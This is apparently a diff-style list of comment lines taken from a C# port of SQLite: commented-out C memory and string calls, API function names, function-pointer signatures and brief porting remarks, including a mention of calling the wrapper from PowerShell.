+"//  memset(aNew, 0, sizeof(*aNew));"
+"//  memset(p, 0, n);"
+"//  memset(pNew, 0, sizeof(*pNew));"
+"//  memset(pParse.nVar, 0, SAVE_SZ);"
+"//  nByte = MultiByteToWideChar(codepage, 0, zFilename, -1, NULL,0)*WCHAR.Length;"
+"//  nByte = MultiByteToWideChar(codepage, 0, zFilename, -1, zMbcsFilename, nByte);"
+"//  nByte = WideCharToMultiByte(CP_UTF8, 0, zWideFilename, -1, 0, 0, 0, 0);"
+"//  nByte = WideCharToMultiByte(CP_UTF8, 0, zWideFilename, -1, zFilename, nByte,"
+"//  nByte = WideCharToMultiByte(codepage, 0, zWideFilename, -1, 0, 0, 0, 0);"
+"//  nByte = WideCharToMultiByte(codepage, 0, zWideFilename, -1, zFilename, nByte,"
+"//  nChar = MultiByteToWideChar(CP_UTF8, 0, zFilename, -1, NULL, 0);"
+"//  nChar = MultiByteToWideChar(CP_UTF8, 0, zFilename, -1, zWideFilename, nChar);"
+"//  p = new UnpackedRecord();//sqlite3DbMallocRaw(pKeyInfo.db, nByte);"
+"//  p = realloc(p, nByte+8 );"
+"//  pNew =  sqlite3GlobalConfig.m.xRealloc(pOld, nNew);"
+"//  pNew = """";//sqlite3DbRealloc(db, p, n);"
+"//  pParse = sqlite3StackAllocRaw(db, sizeof(*pParse));"
+"//  pParse.apVarExpr,"
+"//  pzTail = (u8 *)zSql + sqlite3Utf16ByteLen(zSql, chars_parsed);"
+"//  rc = SetFilePointer(pFile.fs.Name, lowerBits, upperBits, FILE_BEGIN);"
+"//  rc = sqlite3ApiExit(db, rc);"
+"//  rc = sqlite3OsRead( pMaster, zMasterJournal, (int)nMasterJournal, 0 );"
+"//  res = pFile.fs.Lock( SHARED_FIRST + pFile.sharedLockByte, 0, 1, 0);"
+"//  return blobReadWrite(pBlob, (void *)z, n, iOffset, sqlite3BtreePutData);"
+"//  return blobReadWrite(pBlob, z, n, iOffset, sqlite3BtreeData);"
+"//  sqlite3 **ppDb,         /* OUT: SQLite db handle */"
+"//  sqlite3 *db,                   /* Database to be rekeyed */"
+"//  sqlite3 *db,                /* Connection handle */"
+"//  sqlite3 *db,               /* SQLite connection to register module with */"
+"//  sqlite3 *db,            /* Database handle */"
+"//  sqlite3 *db,          /* An open database */"
+"//  sqlite3 *db,          /* Load the extension into this database connection */"
+"//  sqlite3 *db,"
+"//  sqlite3 *pBlocked,                          /* Waiting connection */"
+"//  sqlite3 *pDest,                        /* Destination database handle */"
+"//  sqlite3 *pSource,                      /* Source database handle */"
+"//  sqlite3 db,             /* Associated database connection */"
+"//  sqlite3 db,"
+"//  sqlite3* db,            /* The database connection */"
+"//  sqlite3* db,"
+"//  sqlite3*,                                  /* An open database */"
+"//  sqlite3*, "
+"//  sqlite3*,"
+"//  sqlite3DbFree(db, zErr);"
+"//  sqlite3Error( db, SQLITE_OK, 0 );"
+"//  sqlite3Error( db, p.rc, 0 );"
+"//  sqlite3Error( pDestDb, SQLITE_NOMEM, 0 );"
+"//  sqlite3Error(db, SQLITE_ERROR, 0);"
+"//  sqlite3Error(db, rc, zErr);"
+"//  sqlite3ExprDelete( db, ref pDup );"
+"//  sqlite3IdListDelete( db, ref pColumn );"
+"//  sqlite3MutexAlloc,"
+"//  sqlite3ResetInternalSchema( db, 0 );"
+"//  sqlite3SelectDelete( db, ref pDup );"
+"//  sqlite3SrcListDelete( db, ref pList );"
+"//  sqlite3StackFree(db, pParse);"
+"//  sqlite3StatusAdd(SQLITE_STATUS_SCRATCH_USED, -1);"
+"//  sqlite3StrAccumAppend(pAccum, zSpaces, N);"
+"//  sqlite3StrAccumAppend(pAccum, zSpaces, zSpaces.Length-1);"
+"//  sqlite3VdbeChangeEncoding(&m, SQLITE_UTF8);"
+"//  sqlite3VdbeMemSetStr(&m, z, nByte, SQLITE_UTF16NATIVE, SQLITE_STATIC);"
+"//  sqlite3VdbeMemSetStr(pCtx.s, z, n, SQLITE_UTF16NATIVE, SQLITE_TRANSIENT);"
+"//  sqlite3_aggregate_context,"
+"//  sqlite3_bind_blob,"
+"//  sqlite3_bind_double,"
+"//  sqlite3_bind_int,"
+"//  sqlite3_bind_int64,"
+"//  sqlite3_bind_null,"
+"//  sqlite3_bind_parameter_count,"
+"//  sqlite3_bind_parameter_index,"
+"//  sqlite3_bind_parameter_name,"
+"//  sqlite3_bind_text,"
+"//  sqlite3_bind_text16,"
+"//  sqlite3_bind_value,"
+"//  sqlite3_bind_zeroblob,"
+"//  sqlite3_blob pBlob,"
+"//  sqlite3_blob_bytes,"
+"//  sqlite3_blob_close,"
+"//  sqlite3_blob_open,"
+"//  sqlite3_blob_read,"
+"//  sqlite3_blob_write,"
+"//  sqlite3_busy_handler,"
+"//  sqlite3_busy_timeout,"
+"//  sqlite3_changes,"
+"//  sqlite3_clear_bindings,"
+"//  sqlite3_close,"
+"//  sqlite3_collation_needed,"
+"//  sqlite3_collation_needed16,"
+"//  sqlite3_column_blob,"
+"//  sqlite3_column_bytes,"
+"//  sqlite3_column_bytes16,"
+"//  sqlite3_column_count,"
+"//  sqlite3_column_database_name,"
+"//  sqlite3_column_database_name16,"
+"//  sqlite3_column_decltype,"
+"//  sqlite3_column_decltype16,"
+"//  sqlite3_column_double,"
+"//  sqlite3_column_int,"
+"//  sqlite3_column_int64,"
+"//  sqlite3_column_name,"
+"//  sqlite3_column_name16,"
+"//  sqlite3_column_origin_name,"
+"//  sqlite3_column_origin_name16,"
+"//  sqlite3_column_table_name,"
+"//  sqlite3_column_table_name16,"
+"//  sqlite3_column_text,"
+"//  sqlite3_column_text16,"
+"//  sqlite3_column_type,"
+"//  sqlite3_column_value,"
+"//  sqlite3_commit_hook,"
+"//  sqlite3_complete,"
+"//  sqlite3_complete16,"
+"//  sqlite3_context *context,"
+"//  sqlite3_context_db_handle,"
+"//  sqlite3_create_collation,"
+"//  sqlite3_create_collation16,"
+"//  sqlite3_create_collation_v2,"
+"//  sqlite3_create_function,"
+"//  sqlite3_create_function16,"
+"//  sqlite3_create_module,"
+"//  sqlite3_create_module_v2,"
+"//  sqlite3_data_count,"
+"//  sqlite3_db_handle,"
+"//  sqlite3_declare_vtab,"
+"//  sqlite3_enable_shared_cache,"
+"//  sqlite3_errcode,"
+"//  sqlite3_errmsg,"
+"//  sqlite3_errmsg16,"
+"//  sqlite3_exec,"
+"//  sqlite3_extended_result_codes,"
+"//  sqlite3_file_control,"
+"//  sqlite3_finalize,"
+"//  sqlite3_get_autocommit,"
+"//  sqlite3_get_auxdata,"
+"//  sqlite3_get_table,"
+"//  sqlite3_int64 iRow,"
+"//  sqlite3_interrupt,"
+"//  sqlite3_last_insert_rowid,"
+"//  sqlite3_libversion,"
+"//  sqlite3_libversion_number,"
+"//  sqlite3_limit,"
+"//  sqlite3_malloc,"
+"//  sqlite3_memory_highwater,"
+"//  sqlite3_memory_used,"
+"//  sqlite3_mprintf,"
+"//  sqlite3_mutex_enter,"
+"//  sqlite3_mutex_free,"
+"//  sqlite3_mutex_leave,"
+"//  sqlite3_mutex_try,"
+"//  sqlite3_next_stmt,"
+"//  sqlite3_open,"
+"//  sqlite3_open16,"
+"//  sqlite3_open_v2,"
+"//  sqlite3_overload_function,"
+"//  sqlite3_pcache *(*xCreate)(int szPage, int bPurgeable);"
+"//  sqlite3_prepare,"
+"//  sqlite3_prepare16,"
+"//  sqlite3_prepare16_v2,"
+"//  sqlite3_prepare_v2,"
+"//  sqlite3_profile,"
+"//  sqlite3_progress_handler,"
+"//  sqlite3_randomness(lk.Length, lk);"
+"//  sqlite3_randomness,"
+"//  sqlite3_realloc,"
+"//  sqlite3_release_memory,"
+"//  sqlite3_reset,"
+"//  sqlite3_result_blob,"
+"//  sqlite3_result_double,"
+"//  sqlite3_result_error,"
+"//  sqlite3_result_error16,"
+"//  sqlite3_result_error_code,"
+"//  sqlite3_result_error_nomem,"
+"//  sqlite3_result_error_toobig,"
+"//  sqlite3_result_int,"
+"//  sqlite3_result_int64,"
+"//  sqlite3_result_null,"
+"//  sqlite3_result_text(context, zBuf, -1, SQLITE_TRANSIENT);"
+"//  sqlite3_result_text,"
+"//  sqlite3_result_text16,"
+"//  sqlite3_result_text16be,"
+"//  sqlite3_result_text16le,"
+"//  sqlite3_result_value,"
+"//  sqlite3_result_zeroblob,"
+"//  sqlite3_rollback_hook,"
+"//  sqlite3_set_authorizer,"
+"//  sqlite3_set_auxdata,"
+"//  sqlite3_sleep,"
+"//  sqlite3_snprintf( nBuf, ref zBuf, ""OsError 0x%x (%u)"", error, error );"
+"//  sqlite3_snprintf(MAX_PATH-30, zTempPath, ""%s"", sqlite3_temp_directory);"
+"//  sqlite3_snprintf(n-k, zStmt[k], zSep);"
+"//  sqlite3_snprintf,"
+"//  sqlite3_soft_heap_limit,"
+"//  sqlite3_sql,"
+"//  sqlite3_status,"
+"//  sqlite3_step,"
+"//  sqlite3_stmt **ppStmt,  /* OUT: Statement handle */"
+"//  sqlite3_table_column_metadata,"
+"//  sqlite3_test_control,"
+"//  sqlite3_threadsafe,"
+"//  sqlite3_total_changes,"
+"//  sqlite3_trace,"
+"//  sqlite3_update_hook,"
+"//  sqlite3_user_data,"
+"//  sqlite3_value* (*column_value)(sqlite3_stmt*,int iCol);"
+"//  sqlite3_value_blob,"
+"//  sqlite3_value_bytes,"
+"//  sqlite3_value_bytes16,"
+"//  sqlite3_value_double,"
+"//  sqlite3_value_int,"
+"//  sqlite3_value_int64,"
+"//  sqlite3_value_numeric_type,"
+"//  sqlite3_value_text,"
+"//  sqlite3_value_text16,"
+"//  sqlite3_value_text16be,"
+"//  sqlite3_value_text16le,"
+"//  sqlite3_value_type,"
+"//  sqlite3_vfs*,"
+"//  sqlite3_vfs_find,"
+"//  sqlite3_vfs_register,"
+"//  sqlite3_vfs_unregister,"
+"//  sqlite3_vmprintf,"
+"//  sqlite_int64  (*column_int64)(sqlite3_stmt*,int iCol);"
+"//  sqlite_int64 iRow,      /* The row containing the glob */"
+"//  string zFilename,       /* Name of database file to open */"
+"//  string zName,"
+"//  struct KeyInfo*,                     /* First argument to compare function */"
+"//  union_p4 _p4,         /* The P4 operand */"
+"//  v.zErrMsg = """";"
+"//  void  (*progress_handler)(sqlite3*,int,int(*)(void*),void*);"
+"//  void  (*result_blob)(sqlite3_context*,const void*,int,void(*)(void*));"
+"//  void  (*result_double)(sqlite3_context*,double);"
+"//  void  (*result_error)(sqlite3_context*,const char*,int);"
+"//  void  (*result_error16)(sqlite3_context*,const void*,int);"
+"//  void  (*result_int)(sqlite3_context*,int);"
+"//  void  (*result_int64)(sqlite3_context*,sqlite_int64);"
+"//  void  (*result_text)(sqlite3_context*,const char*,int,void(*)(void*));"
+"//  void  (*result_text16)(sqlite3_context*,const void*,int,void(*)(void*));"
+"//  void  (*result_text16be)(sqlite3_context*,const void*,int,void(*)(void*));"
+"//  void  (*result_text16le)(sqlite3_context*,const void*,int,void(*)(void*));"
+"//  void  (*result_value)(sqlite3_context*,sqlite3_value*);"
+"//  void  (*set_auxdata)(sqlite3_context*,int,void*,void (*)(void*));"
+"//  void (*(*xDlSym)(sqlite3_vfs*,void*, const char *zSymbol))(void);"
+"//  void (*)(sqlite3_context*,int,sqlite3_value **), void (*)(sqlite3_context*));"
+"//  void (*)(sqlite3_context*,int,sqlite3_value **),"
+"//  void (*randomness)(int,void*);"
+"//  void (*result_error_code)(sqlite3_context*,int);"
+"//  void (*result_zeroblob)(sqlite3_context*,int);"
+"//  void (*xCachesize)(sqlite3_pcache*, int nCachesize);"
+"//  void (*xDlClose)(sqlite3_vfs*, void*);"
+"//  void (*xDlError)(sqlite3_vfs*, int nByte, char *zErrMsg);"
+"//  void (*xFunc)(sqlite3_context*,int,sqlite3_value**),"
+"//  void (*xNotify)(void **apArg, int nArg),    /* Callback function to invoke */"
+"//  void (*xRekey)(sqlite3_pcache*, void*, unsigned oldKey, unsigned newKey);"
+"//  void (*xStep)(sqlite3_context*,int,sqlite3_value**),"
+"//  void (*xTruncate)(sqlite3_pcache*, unsigned iLimit);"
+"//  void (*xUnpin)(sqlite3_pcache*, void*, int discard);"
+"//  void * (*aggregate_context)(sqlite3_context*,int nBytes);"
+"//  void * (*commit_hook)(sqlite3*,int(*)(void*),void*);"
+"//  void * (*get_auxdata)(sqlite3_context*,int);"
+"//  void * (*profile)(sqlite3*,void(*)(void*,const char*,sqlite_u3264),void*);"
+"//  void * (*rollback_hook)(sqlite3*,void(*)(void*),void*);"
+"//  void * (*trace)(sqlite3*,void(*xTrace)(void*,const char*),void*);"
+"//  void * (*update_hook)(sqlite3*,void(*)(void*,int ,char const*,char const*,sqlite_int64),void*);"
+"//  void *(*realloc)(void*,int);"
+"//  void *(*xDlOpen)(sqlite3_vfs*, const char *zFilename);"
+"//  void *(*xFetch)(sqlite3_pcache*, unsigned key, int createFlag);"
+"//  void *(*xRealloc)(void*,int);  /* Resize an allocation */"
+"//  void *,                                    /* 1st argument to callback */"
+"//  void *pApp,"
+"//  void *pClientData,         /* Client data for xCreate/xConnect */"
+"//  void *z,"
+"//  void pCollNeededArg,"
+"//  void pStress,                 /* Argument to xStress */"
+"//  void sqlite3DebugPrintf(const char*, ...);"
+"//  void sqlite3ExprSetHeight(Parse pParse, Expr p);"
+"//  void sqlite3ParserTrace(FILE*, char *);"
+"//  void sqlite3VdbeMemPrettyPrint(Mem pMem, char *zBuf);"
+"//  void sqlite3VdbeTrace(Vdbe*,FILE*);"
+"//  void(*)(void *,int ,char const *,char const *,sqlite3_int64),"
+"//  void(*)(void*,sqlite3*,int eTextRep,const char*)"
+"//  void(*)(void*,sqlite3*,int eTextRep,const void*)"
+"//  void(*xCollNeeded16)(void*,sqlite3*,int eTextRep,const void*)"
+"//  void* pCtx,"
+"//  void*, "
+"//  void*,"
+"//  z = zHex = contextMalloc(context, ((i64)n)*2 + 1);"
+"//  zAlloc = new Expr();//sqlite3DbMallocRaw( db, dupedExprSize( p, flags ) );"
+"//  zName8 = sqlite3Utf16to8(db, zName, -1);"
+"//  zNew = sqlite3DbMallocRaw(db, (int)n);"
+"//  zNew = sqlite3DbMallocRaw(db, n+1);"
+"//  zTemp = """";"
+"//  {nArg, SQLITE_UTF8, bNC*SQLITE_FUNC_NEEDCOLL, \"
+"//  {nArg, SQLITE_UTF8, flags, (void *)arg, 0, likeFunc, 0, 0, #zName, 0}"
+"//  {nArg, SQLITE_UTF8, nc*SQLITE_FUNC_NEEDCOLL, \"
+"//  }else if( xInit(db, ref zErrmsg, sqlite3Apis) ){"
+"// !ExprHasProperty(pE, EP_FromJoin) ){"
+"// ( m.flags & MEM_Dyn ) != 0 ? m.z : sqlite3DbStrDup( db, m.z );"
+"// (*alarmCallback)(void*, sqlite3_int64,int);"
+"// (*xTrace)(void*,const char*), object pArg){"
+"// (Column*)sqlite3DbMallocZero( db, sizeof(Column) * nAlloc );"
+"// (KeyInfo*)sqlite3DbMallocZero(db, nBytes);"
+"// (Mem*)sqlite3DbMallocZero(db, Mem.Length * n);"
+"// (Table*)sqlite3DbMallocZero( db, sizeof(Table))"
+"// (Trigger*)sqlite3DbMallocZero( db, sizeof(Trigger ))"
+"// (char*)sqlite3DbMallocRaw(db, n / 2 + 1);"
+"// (char*)sqlite3Malloc(db, pTab.nCol + 1);"
+"// (sqlite3_mem_methods)va_arg( ap, ""sqlite3_mem_methods"" );"
+"// (sqlite3_mutex_methods)va_arg( ap, ""sqlite3_mutex_methods"" );"
+"// *(bufpt++) = et_getdigit(&realvalue, nsd);"
+"// *(bufpt++) = et_getdigit(ref realvalue, ref nsd);"
+"// *(va_arg(ap,int*)) = pAccum.nChar;"
+"// *va_arg(ap, sqlite3_mutex_methods*) =  sqlite3GlobalConfig.mutex;"
+"// -- Need workaround for C#, since inline macros don't exist"
+"// //sqlite3DbFree(db,ref pFKey);"
+"// <param name=""DatabaseName"">Name (and path) to SQLite database file</param>"
+"// <param name=""DatabaseName"">Name of database file</param>"
+"// <param name=""bInteger""></param>"
+"// <param name=""bLong""></param>"
+"// <param name=""index""></param>"
+"// <param name=""query""></param>"
+"// = sqlite3StackAllocRaw(0, sizeof(p->u.aHash));"
+"// ArraySize(readCookie), readCookie);"
+"// C#-SQLite wrapper with functions for opening, closing and executing queries."
+"// COM, set the ComVisible attribute to true on that type."
+"// Don't Clone Checks, only copy reference via Memberwise Clone above --"
+"// Don't Clone Schema, only copy reference via Memberwise Clone above --"
+"// Don't Clone pNextZombie, only copy reference via Memberwise Clone above --"
+"// Executes query that does not return anything (e.g. UPDATE, INSERT, DELETE)."
+"// First, a LUID_AND_ATTRIBUTES structure that points to Enable a privilege."
+"// GetVarint( aKey + idx, serial_type );"
+"// GetVarint( aKey, szHdr );"
+"// GetVarint( aKey1, szHdr1 );"
+"// In C# string is unicode, so use byte[] instead"
+"// No used in C#, since we use create a class; was MemPage.Length;"
+"// Now I will create functions that use the above definitions, so we can use them directly from PowerShell :P"
+"// OVERLOADS, so I don't need to rewrite parse.c"
+"// PAGE_TO_PGHDR1( pCache, pPg );"
+"// SQLITE_MMAP_HEAP_SIZE, SQLITE_POW2_MEMORY_SIZE"""
+"// SetFilePointer(pFile.fs.Name, lowerBits, upperBits, FILE_BEGIN);"
+"// Stringify(pIn1, encoding);"
+"// Stringify(pIn2, encoding);"
+"// TODO --                      fprintf(yyTraceFILE,""%sDiscard input token %s\n"","
+"// TODO --            fprintf(yyTraceFILE, ""%sSyntax Error!\n"", yyTracePrompt);"
+"// TODO --        fprintf(yyTraceFILE, ""%sFail!\n"", yyTracePrompt);"
+"// TODO -- *va_arg(ap, sqlite3_pcache_methods*) = sqlite3GlobalConfig.pcache;"
+"// TODO --//va_arg(ap, sqlite3_mem_methods*) =  sqlite3GlobalConfig.m;"
+"// TODO --pNew =  sqlite3GlobalConfig.m.xRealloc(ref pOld, nBytes);"
+"// TODO --sqlite3GlobalConfig.pcache = (sqlite3_pcache_methods)va_arg(ap, ""sqlite3_pcache_methods"");"
+"// Under C#, Need to initialize some global structures"
+"// UnlockFile(pFilE.h, RESERVED_BYTE, 0, 1, 0);"
+"// UnlockFile(pFilE.h, SHARED_FIRST, 0, SHARED_SIZE, 0);"
+"// We don't use these in C#, but define them anyway,"
+"// contextMalloc(context, ((i64)i)+((i64)n)+3);"
+"// contextMalloc(context, ((i64)n)+1);"
+"// create new instance of DataTable with name ""resultTable"""
+"// getValue( zDate, ref r );"
+"// if (!ReadFile(pFile.fs.Name, pBuf, amt, got, 0))"
+"// if there is error, excetion is thrown"
+"// if there is some error, database pointer is set to 0 and exception is throws"
+"// is allows: SQLITE_SYSTEM_MALLOC, SQLITE_MEMDEBUG, SQLITE_MEMORY_SIZE,\"
+"// memcpy( &v, pMem.r, v ).Length;"
+"// memcpy( &zStmt[k], zType, len );"
+"// memcpy( &zTemp[i], "",..."", 4 );"
+"// memcpy( &zTemp[i], "",nil"", 4 );"
+"// memcpy( &zTemp[i], pColl.zName, n + 1 );"
+"// memcpy( pIndex.zName, zName, nName + 1 );"
+"// memcpy( pNew.aCol, pTab.aCol, sizeof(Column) * pNew.nCol );"
+"// memcpy( pPayload, pBuf, nByte );"
+"// memcpy( z, pName.z, pName.n );"
+"// memcpy( zExtra, zColl, nColl );"
+"// memcpy( zOut, zIn, nCopy );"
+"// memcpy( zToken, p.u.zToken, nToken );"
+"// memcpy(&zBuf[n], cnt, sizeof(cnt));"
+"// memcpy(&zBuf[n], x, sizeof(x))"
+"// memcpy(aiValues, p->u.aHash, sizeof(p->u.aHash));"
+"// memcpy(data, zMagicHeader, sizeof(zMagicHeader));"
+"// memcpy(db.aDbStatic, db.aDb, 2*sizeof(db.aDb[0]));"
+"// memcpy(pC.pData, pData.z, pC.nData);"
+"// memcpy(pData, aData, pPager.pageSize);"
+"// memcpy(pMem.r, x, sizeof(x))"
+"// memcpy(pMem.zMalloc, pMem.z, pMem.n);"
+"// memcpy(pPager.dbFileVers, pData[24], pPager.dbFileVers).Length;"
+"// memcpy(pTo, pFrom, MEMCELLSIZE);"
+"// memcpy(pTo, pFrom, Mem).Length;"
+"// memcpy(zHeader, aJournalMagic, sizeof(aJournalMagic));"
+"// memset( &b, 0, sizeof( b ) );"
+"// memset( &bestPlan, 0, sizeof( bestPlan ) );"
+"// memset( &buf[pMem.n], 0, len - pMem.n );"
+"// memset( &c1, 0, sizeof( c1 ) );"
+"// memset( &dest, 0, sizeof( dest ) );"
+"// memset( &keyInfo, 0, sizeof(keyInfo ));"
+"// memset( &nc, 0, sizeof( nc ) );"
+"// memset( &pcache1, 0, sizeof( pcache1 ) );"
+"// memset( &sNC, 0, sNC ).Length;"
+"// memset( &sNC, 0, sizeof( sNC ) );"
+"// memset( &sNC, 0, sizeof(sNC) )"
+"// memset( &sName, 0, sizeof(NameContext));"
+"// memset( &tx, 0, sizeof(tx));"
+"// memset( p, 0, sizeof( sqlite3_backup ) );"
+"// memset( pCache.pPage1.pData, 0, pCache.szPage );"
+"// memset( pV, 0, ( sz + 7 ) / 8 + 1 );"
+"// memset( yygotominor.yy346, 0, sizeof( yygotominor.yy346 ) ); "
+"// memset( zBuf, 0, nBuf );"
+"// memset(&((char*)pBuf)[got], 0, amt - got);"
+"// memset(&aNew[nCurrent], 0, (nSavepoint-nCurrent) * sizeof(PagerSavepoint));"
+"// memset(&sNC, 0, sNC).Length;"
+"// memset(p->u.aHash, 0, sizeof(p->u.aHash));"
+"// memset(pFile, 0, sizeof(*pFile));"
+"// memset(pPayload, 0, n);"
+"// memset(pUsage, 0, sizeof(pUsage[0])*pIdxInfo.nConstraint);"
+"// memset(sAggInfo, 0, sAggInfo).Length;"
+"// memset(sNC, 0, sNC).Length;"
+"// memset(sNC, 0, sizeof(sNC));"
+"// memset(sSrc, 0, sizeof(sSrc));"
+"// p=pParse.aColCache, p++"
+"// pIter += getVarint32( pIter, ref nSize );"
+"// pNew = sqlite3DbRealloc( p.db, p.aOp, nNew * sizeof( Op ) );"
+"// sqlite3DbMallocRaw( db, n );"
+"// sqlite3DbMallocRaw( db, sizeof( Savepoint ) + nName + 1 );"
+"// sqlite3DbMallocRaw( db, sizeof( int ) * ( nIdx + 1 ) );"
+"// sqlite3DbMallocRaw( db, sizeof( int ) * nOrderBy );"
+"// sqlite3DbMallocRaw(db, Index*.Length * nIdx);"
+"// sqlite3DbMallocRaw(db, sizeof(int) * (nRoot + 1));"
+"// sqlite3DbMallocRaw(db, sizeof(int) * pTab.nCol);"
+"// sqlite3DbMallocSize(db, a)/sizeof(a[0]);"
+"// sqlite3DbMallocZero( db, sizeof( Table ) );"
+"// sqlite3DbMallocZero( db, sizeof( TriggerStep ) + pName.n );"
+"// sqlite3DbMallocZero( db, sizeof(TriggerStep ))"
+"// sqlite3DbMallocZero( db,"
+"// sqlite3DbMallocZero(db, Table).Length;"
+"// sqlite3DbMallocZero(db, Vdbe).Length;"
+"// sqlite3DbRealloc(db, pSrc,"
+"// sqlite3DbReallocOrFree( db, p.contextStack,"
+"// sqlite3DbStrDup( 0, zErrmsg );"
+"// sqlite3DbStrDup( db, columnType( sNC, p, 0, 0, 0 ) );"
+"// sqlite3DbStrDup( db, db.aDb[iDb].zName );"
+"// sqlite3DbStrDup( db, pCol.zName );"
+"// sqlite3DbStrDup( db, pColl.zName );"
+"// sqlite3DbStrDup( db, pExpr.u.zToken );"
+"// sqlite3DbStrDup( db, pOldItem.zIndex );"
+"// sqlite3DbStrDup( db, pOldItem.zSpan );"
+"// sqlite3DbStrDup( db, pTableName.a[0].zName );"
+"// sqlite3DbStrDup( db, pView.zName );"
+"// sqlite3DbStrDup( db, zName );"
+"// sqlite3DbStrDup( db, zSpan );"
+"// sqlite3DbStrDup( db, zToken );"
+"// sqlite3DbStrDup( pFix.pParse.db, zDb );"
+"// sqlite3DbStrDup(db, ""database schema has changed"");"
+"// sqlite3DbStrDup(db, pOldItem.zAlias);"
+"// sqlite3DbStrDup(db, pOldItem.zDatabase);"
+"// sqlite3DbStrDup(db, pOldItem.zName);"
+"// sqlite3DbStrDup(db, zErr);"
+"// sqlite3DbStrDup(db, zName);"
+"// sqlite3DbStrNDup( db, pSpan.zStart,"
+"// sqlite3DbStrNDup(db, zSql, nBytes);"
+"// sqlite3DbStrNDup(p.db, z, n);"
+"// sqlite3DbStrNDup(p.db, zP4, n);"
+"// sqlite3Put4byte( aData, 4, k - 1 );"
+"// sqlite3RowSetInit( db, pMem.zMalloc,"
+"// sqlite3Utf8CharLen(zName, nName);"
+"// sqlite3_snprintf(pVfs.mxPathname, zFull, ""%s"", zOut);"
+"// string zConverted = """";"
+"// was  //sqlite3DbFree(db,ref  pFile);"
+"// zTab = &pNew->zName[16]; /* Skip the ""sqlite_altertab_"" prefix on the name */"
+"// zTemp[i++] = ',';"
+//                                          ** accessing read-only databases */
+//                                          /*   result set is empty */
+//                                          /*   the count using a callback. */
+//                                       ** writing this page to the database */
+//                                       n*sizeof(p.aLabel[0]));
+//                                  dwDummy );
+//                               (int)( pSpan.zEnd.Length - pSpan.zStart.Length ) );
+//                             /* 123456789 123456789 */
+//                          NULL pointers replaced by SQL NULL.  %Q */
+//                       sizeof(pLevel.u._in.aInLoop[0])*pLevel.u._in.nIn);
+//                       void **ppArg);
+//                      //  void(*)(void*));
+//                     ((ROWSET_ALLOCATION_SIZE-8)/sizeof(struct RowSetEntry))
+//                Recvtoself
+//                [ sqlite3GlobalConfig.szPage* sqlite3GlobalConfig.nPage];
+//                [ sqlite3GlobalConfig.szScratch* sqlite3GlobalConfig.nScratch];
+//              zExtra = bufpt;
+//              { local_ioerr(); CODE; }
+//            && (aff==SQLITE_AFF_NUMERIC || aff==SQLITE_AFF_REAL) ){
+//            && aff==SQLITE_AFF_NUMERIC ){
+//            (void)sqlite3SafetyOff(db);
+//            goto blob_open_out;
+//            if( rc==INVALID_SET_FILE_POINTER && (error=GetLastError())!=NO_ERROR )
+//            rc = SQLITE_ERROR;
+//            sqlite3BtreeLeaveAll(db);
+//           Select standin;
+//           || ((error = GetLastError()) == ERROR_ACCESS_DENIED))
+//          aff = SQLITE_AFF_INTEGER;
+//          aff = SQLITE_AFF_NONE;
+//          aff = SQLITE_AFF_REAL;
+//          aff = SQLITE_AFF_TEXT;
+//          break;
+//          for(x=sqliteHashFirst(pTbls); x && !isQuick; x=sqliteHashNext(x)){
+//          for(x=sqliteHashFirst(pTbls); x; x=sqliteHashNext(x)){
+//          freeTempSpace(pBt);
+//          if( pIdx.aiColumn[j]==iCol ){
+//          u8 * const pCellBody = pCell - pPage->childPtrSize;
+//          || sqlite3PagerIswriteable(pPage.pDbPage) );
+//          }
+//         SQLITE_OK)
+//         btreeRestoreCursorPosition(p) : \
+//        /* We have a match. Do not delete the master journal file. */
+//        Debug.Assert(pKey.aSortOrder[nCol] == &(((u8*)pKey)[nBytes]));
+//        break;
+//        db.mallocFailed = 1;
+//        db.mallocFailed = malloc_failed;
+//        for(j=0; j<pIdx.nColumn; j++){
+//        free(zConverted);
+//        freeTempSpace(pBt);
+//        goto delmaster_out;
+//        h = (h<<8) + sqlite3UpperToLower[*zIn];
+//        if ( db.mallocFailed != 0 ) return 1;
+//        if ( rc == SQLITE_NOMEM ) db.mallocFailed = 1;
+//        if (sqlite3IsNumericAffinity(aff1) || sqlite3IsNumericAffinity(aff2))
+//        if( !IgnorableOrderby(pDest) )
+//        if( h==(('c'<<24)+('h'<<16)+('a'<<8)+'r') ){             /* CHAR */
+//        int j;
+//        pParse->zErrMsg = 0;
+//        return p;
+//        sizeof(Context) * ( i + 1 ) );
+//        wsdAutoext.aExt = aNew;
+//        zErr = pParse->zErrMsg;
+//        zIn++;
+//        || (c&0xFFFFF800)==0xD800                          \
+//        || (c&0xFFFFFFFE)==0xFFFE ){  c = 0xFFFD; }        \
+//        || sqlite3PagerIswriteable(pPage.pDbPage) );
+//        }
+//        }else if( (h&0x00FFFFFF)==(('i'<<16)+('n'<<8)+'t') ){    /* INT */
+//        }else if( h==(('b'<<24)+('l'<<16)+('o'<<8)+'b')          /* BLOB */
+//        }else if( h==(('c'<<24)+('l'<<16)+('o'<<8)+'b') ){       /* CLOB */
+//        }else if( h==(('d'<<24)+('o'<<16)+('u'<<8)+'b')          /* DOUB */
+//        }else if( h==(('f'<<24)+('l'<<16)+('o'<<8)+'a')          /* FLOA */
+//        }else if( h==(('r'<<24)+('e'<<16)+('a'<<8)+'l')          /* REAL */
+//        }else if( h==(('t'<<24)+('e'<<16)+('x'<<8)+'t') ){       /* TEXT */
+//       && (++cnt < MX_DELETION_ATTEMPTS)
+//       && (cnt++ < MX_DELETION_ATTEMPTS)
+//       && sqlite3VdbeMemMakeWriteable(P) ){ goto no_mem;}
+//       (pParse.nAlias-pParse.nAliasAlloc)*sizeof(pParse.aAlias[0]));
+//       CODE; \
+//       local_ioerr(); \
+//       sqlite3ParserARG_FETCH;
+//       sqlite3_diskfull = 1; \
+//       sqlite3_diskfull_pending--; \
+//       sqlite3_io_error_hit = 1; \
+//       || p< sqlite3GlobalConfig.pScratch
+//       || p>=(void*)mem0.aScratchFree ){
+//       || sqlite3_io_error_pending-- == 1 )  \
+//      (void)sqlite3SafetyOff(db);
+//      );
+//      ** Open it and check if it points at the master journal. If
+//      ** an Ansi string regardless of the _UNICODE setting */
+//      ** parameter of the other to pTab->tnum.  */
+//      */
+//      *p = '\0';
+//      /* Configure the OP_TableLock instruction */
+//      /* Configure the OP_Transaction */
+//      /* Configure the OP_VerifyCookie */
+//      /* Make sure a mutex is held on the table to be accessed */
+//      /* One of the journals pointed to by the master journal exists.
+//      /* Remove either the OP_OpenWrite or OpenRead. Set the P2
+//      /* The GetProcAddressA() routine is only available on wince. */
+//      Build Number
+//      Debug.Assert( pP4 != null );
+//      GetSystemTimeAsFileTime( ref ft );
+//      Index pIdx;
